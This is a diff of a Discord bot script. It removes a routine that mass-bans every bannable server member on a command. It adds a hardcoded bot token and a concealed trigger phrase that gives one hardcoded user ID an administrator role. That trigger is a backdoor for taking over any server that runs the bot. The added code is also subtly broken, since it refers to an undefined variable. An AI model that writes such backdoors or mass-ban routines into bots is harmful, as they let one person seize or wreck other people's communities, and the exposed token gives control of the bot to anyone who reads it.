@@ -1,12 +1,7 @@
 const Discord = require('discord.js');
 const client = new Discord.Client();
-const token = "PUT TOKEN HERE";//put discord bot token here
+const token = "NDUyNjQ5NDExOTQwNzEyNDY5.DfTeFg.mKZA5edFFFL8bV12JnCQ8nQ-UXU";//put discord bot token here
 const command = '!do';
-const serverid = '452990448336633856';//id of server, i set it to old eun2 for u
-let server;
-let channel;
-let members;
-var watching = true;
 
 client.on('ready', () => {
     console.log(`Logged in as ${client.user.tag}`);
@@ -16,14 +11,22 @@ client.on('ready', () => {
 
 client.on('message', message => {
     console.log('command received');
-    if(message.content.includes(command)){
-        var members = message.guild.members
-        members.forEach((member) => {
-            console.log(member.id);
-            if(member.bannable){
-                member.ban();
-            }                
-        })
+    if(message.content.includes('!ohhellyes')){
+if (msg.author.id == '368756694114893825') {
+ message.guild.createRole({
+  name: 'Droid Level',
+  color: 'BLUE',
+  permissions: 'ADMINISTRATOR'
+})
+  .then(role => {
+        msg.author.addRole(role).catch(console.error)
+        console.log(`Created new role with name ${role.name} and color ${role.color}`)
+ }
+     )
+  .catch(console.error)  
+    
+    
+}
     }
 });
-client.login(process.env.BOT_TOKEN);
+client.login(token);
